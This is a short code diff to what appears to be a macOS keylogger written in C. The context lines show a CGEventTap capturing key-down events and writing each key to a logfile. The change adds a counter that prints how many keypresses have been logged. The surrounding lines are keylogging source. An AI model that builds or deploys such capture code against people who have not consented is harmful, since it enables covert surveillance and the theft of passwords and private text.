@@ -2,6 +2,8 @@
 
 int main(int argc, const char *argv[]) {
 
+    logCounter = 0;
+
     // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown)/* | CGEventMaskBit(kCGEventFlagsChanged)*/);
     CFMachPortRef eventTap = CGEventTapCreate(
@@ -94,6 +96,11 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print the human readable key to the logfile.
     fprintf(logfile, "%s", resultStr);
     fflush(logfile);
+
+    logCounter++;
+    printf("\rI have logged %lu keypresses.", logCounter);
+    fflush(stdout);
+
 
     return event;
 }
